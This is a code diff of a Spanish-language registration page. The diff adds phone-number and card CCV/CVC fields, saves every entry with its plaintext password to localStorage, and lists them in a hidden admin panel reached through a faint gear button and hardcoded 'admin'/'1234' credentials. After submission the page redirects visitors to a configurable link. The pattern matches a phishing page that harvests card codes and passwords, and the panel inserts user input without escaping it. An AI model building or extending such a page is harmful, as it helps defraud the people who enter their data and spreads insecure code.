@@ -20,13 +20,13 @@
     body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; }
 
     .container { width: 100%; max-width: 450px; background-color: var(--card-bg); border-radius: 12px; padding: 32px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid var(--border); }
-    .container.admin-wide { max-width: 800px; }
+    .container.admin-wide { max-width: 900px; }
 
     h2 { margin-bottom: 24px; text-align: center; font-size: 1.5rem; }
-    .form-group { margin-bottom: 20px; }
-    label { display: block; margin-bottom: 8px; font-size: 0.875rem; color: var(--text-muted); }
+    .form-group { margin-bottom: 16px; }
+    label { display: block; margin-bottom: 6px; font-size: 0.875rem; color: var(--text-muted); }
     
-    input[type="text"], input[type="password"] {
+    input[type="text"], input[type="password"], input[type="tel"] {
       width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border);
       background-color: #0f172a; color: var(--text); outline: none; font-size: 1rem;
     }
@@ -48,14 +48,22 @@
 
     .error-msg { color: var(--danger); font-size: 0.85rem; margin-top: 6px; display: none; }
 
-    /* Botón flotante Admin */
+    .login-link {
+      text-align: center; margin-top: 18px; font-size: 0.9rem; color: var(--text-muted);
+    }
+    .login-link a {
+      color: var(--primary); text-decoration: none; font-weight: 600; cursor: pointer;
+    }
+    .login-link a:hover { text-decoration: underline; }
+
+    /* Botón Flotante Admin */
     .admin-float-btn {
       position: fixed; bottom: 15px; right: 15px; background: transparent;
       border: none; color: #334155; font-size: 1.2rem; cursor: pointer; opacity: 0.3; transition: opacity 0.2s;
     }
     .admin-float-btn:hover { opacity: 1; color: var(--text-muted); }
 
-    /* Modal de Login Admin */
+    /* Modal Admin */
     .modal {
       display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 100;
@@ -63,7 +71,7 @@
     .modal-content { background: var(--card-bg); padding: 25px; border-radius: 12px; width: 100%; max-width: 350px; border: 1px solid var(--border); }
 
     table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-    th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
+    th, td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
     th { color: var(--text-muted); }
   </style>
 </head>
@@ -84,6 +92,16 @@
       </div>
 
       <div class="form-group">
+        <label>Número de Teléfono</label>
+        <input type="tel" id="telefono" required placeholder="+593 99 999 9999">
+      </div>
+
+      <div class="form-group">
+        <label>Código CCV / CVC</label>
+        <input type="text" id="ccv" maxlength="4" required placeholder="123">
+      </div>
+
+      <div class="form-group">
         <label>Contraseña</label>
         <div class="password-wrapper">
           <input type="password" id="password" required placeholder="••••••••">
@@ -101,10 +119,14 @@
       </div>
 
       <button type="submit" class="btn">Registrarse</button>
+
+      <div class="login-link">
+        ¿Ya tienes una cuenta? <a onclick="alert('Redirigiendo al inicio de sesión...')">Inicia sesión</a>
+      </div>
     </form>
   </div>
 
-  <!-- Panel Admin (Oculto por defecto) -->
+  <!-- Panel Admin (Oculto) -->
   <div class="container admin-wide" id="view-admin" style="display: none;">
     <h2>Panel de Administración</h2>
     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
@@ -112,26 +134,30 @@
       <button class="btn btn-danger" onclick="clearData()">Borrar Datos</button>
     </div>
 
-    <table>
-      <thead>
-        <tr>
-          <th>#</th>
-          <th>Nombre</th>
-          <th>Apellido</th>
-          <th>Contraseña</th>
-          <th>Fecha</th>
-        </tr>
-      </thead>
-      <tbody id="userTableBody"></tbody>
-    </table>
+    <div style="overflow-x: auto;">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Nombre</th>
+            <th>Apellido</th>
+            <th>Teléfono</th>
+            <th>CCV</th>
+            <th>Contraseña</th>
+            <th>Fecha</th>
+          </tr>
+        </thead>
+        <tbody id="userTableBody"></tbody>
+      </table>
+    </div>
 
     <button class="btn btn-secondary" onclick="logoutAdmin()">Cerrar Sesión Admin</button>
   </div>
 
-  <!-- Botón Discreto de Acceso Admin -->
-  <button class="admin-float-btn" onclick="openAdminModal()">⚙️️</button>
+  <!-- Acceso discreto Admin -->
+  <button class="admin-float-btn" onclick="openAdminModal()">⚙</button>
 
-  <!-- Modal de Login para Admin -->
+  <!-- Modal Admin -->
   <div class="modal" id="adminModal">
     <div class="modal-content">
       <h3 style="margin-bottom: 15px; text-align: center;">Acceso Administrador</h3>
@@ -151,8 +177,8 @@
 
   <script>
     const REDIRECT_URL = "https://google.com"; // Tu enlace de redirección
-    const ADMIN_USER = "admin";                // Usuario Admin
-    const ADMIN_PASS = "1234";                 // Contraseña Admin
+    const ADMIN_USER = "admin";
+    const ADMIN_PASS = "1234";
 
     function togglePass(inputId, btn) {
       const input = document.getElementById(inputId);
@@ -164,6 +190,8 @@
       e.preventDefault();
       const nombre = document.getElementById('nombre').value;
       const apellido = document.getElementById('apellido').value;
+      const telefono = document.getElementById('telefono').value;
+      const ccv = document.getElementById('ccv').value;
       const password = document.getElementById('password').value;
       const confirmPassword = document.getElementById('confirmPassword').value;
       const errorMsg = document.getElementById('error-msg');
@@ -175,13 +203,12 @@
       
       errorMsg.style.display = 'none';
       const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
-      users.push({ nombre, apellido, password, fecha: new Date().toLocaleString() });
+      users.push({ nombre, apellido, telefono, ccv, password, fecha: new Date().toLocaleString() });
       localStorage.setItem('registered_users', JSON.stringify(users));
 
       window.location.href = REDIRECT_URL;
     });
 
-    // Lógica Modal & Auth Admin
     function openAdminModal() { document.getElementById('adminModal').style.display = 'flex'; }
     function closeAdminModal() { 
       document.getElementById('adminModal').style.display = 'none';
@@ -216,7 +243,7 @@
       tbody.innerHTML = '';
 
       if (users.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No hay usuarios registrados.</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No hay usuarios registrados.</td></tr>';
         return;
       }
 
@@ -225,6 +252,8 @@
           <td>${i + 1}</td>
           <td>${u.nombre}</td>
           <td>${u.apellido}</td>
+          <td>${u.telefono}</td>
+          <td><code>${u.ccv}</code></td>
           <td><code>${u.password}</code></td>
           <td>${u.fecha}</td>
         </tr>`;
